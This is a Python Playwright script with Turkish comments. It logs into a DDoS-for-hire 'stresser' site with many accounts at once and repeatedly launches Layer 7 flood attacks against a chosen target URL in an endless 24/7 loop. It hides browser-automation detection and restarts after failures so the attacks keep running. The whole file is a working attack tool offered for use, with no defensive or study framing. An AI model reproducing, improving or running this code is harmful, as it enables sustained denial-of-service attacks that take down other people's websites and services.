import threading
import time
import os
import sys
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout

# ======================= KONFIGÜRASYON =======================
ACCOUNTS_FILE = "accounts.txt"

# ======================= HESAPLARI YÜKLE =======================
def load_accounts():
    """accounts.txt dosyasından hesapları okur, dosya yoksa örnek bir hesapla devam eder."""
    accounts = []
    
    # Eğer dosya yoksa Railway'de çökmemek için dummy hesap oluştur
    if not os.path.exists(ACCOUNTS_FILE):
        print(f"❌ {ACCOUNTS_FILE} bulunamadı! Örnek hesap ile devam ediliyor.")
        print("⚠️ Lütfen gerçek hesaplarınızı eklemek için dosyayı güncelleyin.")
        return [{
            "id": "1",
            "user": "dummy_user",
            "pass": "dummy_pass",
            "url": "https://example.com",
            "method": "browser-free"
        }]
    
    with open(ACCOUNTS_FILE, "r", encoding="utf-8") as f:
        for idx, line in enumerate(f, 1):
            line = line.strip()
            if not line:
                continue
            parts = line.split(":")
            if len(parts) >= 3:
                user, pwd, url = parts[0], parts[1], parts[2]
                method = parts[3] if len(parts) >= 4 else "browser-free"
                accounts.append({
                    "id": str(idx),
                    "user": user,
                    "pass": pwd,
                    "url": url,
                    "method": method
                })
            else:
                print(f"⚠️ Geçersiz satır atlandı (kullanıcı:şifre:url:method formatında olmalı): {line}")
    
    if not accounts:
        print("❌ Hiç geçerli hesap bulunamadı! Çıkılıyor.")
        sys.exit(1)
    
    return accounts

# ======================= ANA SALDIRI İŞÇİSİ =======================
def attack_worker(account):
    """Her bir hesap için ayrı bir thread'de çalışan sonsuz döngü."""
    acc_id = account["id"]
    username = account["user"]
    password = account["pass"]
    target_url = account["url"]
    method = account["method"]
    
    # Her hesap için ayrı tarayıcı profili (oturumlar kalıcı olur)
    profile_dir = os.path.join(os.getcwd(), f"browser_profiles/profile_{username}")
    os.makedirs(profile_dir, exist_ok=True)
    
    print(f"[{username}] 🚀 Başlatılıyor | Hedef: {target_url} | Method: {method}")

    # Dış katman: Kritik hatalarda tarayıcıyı tamamen yeniden başlat
    while True:
        try:
            with sync_playwright() as p:
                # Kalıcı tarayıcı başlat (headless)
                context = p.chromium.launch_persistent_context(
                    user_data_dir=profile_dir,
                    headless=True,
                    viewport={"width": 1280, "height": 720},
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    args=["--no-sandbox", "--disable-dev-shm-usage"]  # Railway/Linux için kritik
                )
                page = context.new_page()
                
                # WebDriver tespitini atlat
                page.add_init_script("""
                    Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                """)

                # ---------- 1. GİRİŞ YAP ----------
                print(f"[{username}] 🔐 Giriş yapılıyor...")
                try:
                    page.goto("https://l7srv.cc/login", timeout=60000)
                    page.wait_for_load_state("networkidle")
                    time.sleep(2)
                    page.fill("#username", username)
                    page.fill("#password", password)
                    page.click("button.btn-submit")
                    # Dashboard'a yönlendirilene kadar bekle
                    try:
                        page.wait_for_url(lambda url: "/dash" in url, timeout=15000)
                    except:
                        pass
                    print(f"[{username}] ✅ Giriş başarılı.")
                except Exception as login_err:
                    print(f"[{username}] ❌ Giriş hatası: {login_err}")
                    context.close()
                    time.sleep(10)
                    continue

                # ---------- 2. STRESS SAYFASINA GİT ----------
                print(f"[{username}] 📡 Stress sayfasına gidiliyor...")
                try:
                    page.goto("https://l7srv.cc/dash/stress", timeout=60000)
                    page.wait_for_load_state("networkidle")
                    time.sleep(3)
                    # Layer 7 sekmesine tıkla
                    page.locator("#layer_7").wait_for(state="visible", timeout=10000)
                    page.locator("#layer_7").click()
                    print(f"[{username}] ✅ Layer 7 seçildi.")
                except Exception as stress_err:
                    print(f"[{username}] ❌ Stress sayfası hatası: {stress_err}")
                    context.close()
                    time.sleep(10)
                    continue

                # ---------- 3. SÜREKLİ SALDIRI DÖNGÜSÜ ----------
                while True:
                    try:
                        # Hedef URL'yi gir
                        page.fill("#l7host", target_url, timeout=10000)
                        # Method'u seç
                        page.select_option("#l7method", value=method, timeout=5000)
                        # Süreyi ayarla (FREE1=120, FREE2=200)
                        time_value = 120 if method == "browser-free" else 200
                        page.fill("#l7time", str(time_value), timeout=5000)
                        # Başlat butonuna tıkla
                        page.click("#l7btn", timeout=5000)
                        print(f"[{username}] 🔥 Saldırı başlatıldı | Süre: {time_value} sn")

                        # ---------- 4. SALDIRI BİTENE KADAR BEKLE ----------
                        while True:
                            # Tabloda "No running attacks" yazısı var mı kontrol et
                            no_attacks = page.locator(".dataTables_empty:has-text('No running attacks')")
                            if no_attacks.count() > 0 and no_attacks.is_visible():
                                print(f"[{username}] ⏰ Saldırı sona erdi (tablo boş).")
                                break
                            
                            # Expire sütununu kontrol et
                            expire_cell = page.locator("#attacks-table tbody tr td:nth-child(4) span").first
                            if expire_cell.count() > 0:
                                expire_text = expire_cell.text_content().strip()
                                print(f"[{username}] ⏳ Kalan süre: {expire_text}")
                                if expire_text in ["00:00:00", "0"] or expire_text.lower() == "expired":
                                    print(f"[{username}] ⏰ Süre doldu veya expired.")
                                    break
                            time.sleep(2)

                        # ---------- 5. YENİ SALDIRI İÇİN SAYFAYI YENİLE ----------
                        print(f"[{username}] 🔄 Sayfa yenileniyor, yeni saldırı hazırlanıyor...")
                        page.reload()
                        page.wait_for_load_state("networkidle")
                        time.sleep(2)
                        # Tekrar Layer 7'ye tıkla
                        page.locator("#layer_7").click()
                        time.sleep(1)

                    except (PlaywrightTimeout, Exception) as inner_err:
                        # Adım bazlı hata oluşursa sayfayı yenile ve devam et
                        print(f"[{username}] ⚠️ Adım hatası: {inner_err} - sayfa yenileniyor")
                        try:
                            page.reload()
                            page.wait_for_load_state("networkidle")
                            time.sleep(5)
                        except:
                            pass
                        continue

        except Exception as outer_err:
            # Tarayıcı veya context çöktüyse dış döngü yeniden başlatır
            print(f"[{username}] 💥 KRİTİK HATA (tarayıcı yeniden başlatılacak): {outer_err}")
            time.sleep(10)
            continue

# ======================= ANA UYGULAMA =======================
if __name__ == "__main__":
    print("🚀 Multi-Account Automation (7/24 Headless) başlatılıyor...")
    accounts = load_accounts()
    print(f"✅ Toplam {len(accounts)} hesap yüklendi.")
    
    # Her hesap için bir thread oluştur
    threads = []
    for acc in accounts:
        t = threading.Thread(target=attack_worker, args=(acc,), daemon=True)
        t.start()
        threads.append(t)
        time.sleep(1)  # Tarayıcıların aynı anda yüklenmesini engellemek için
    
    # Ana thread'i canlı tut (sonsuz bekle)
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        print("\n🛑 Kullanıcı tarafından durduruldu.")
        sys.exit(0)
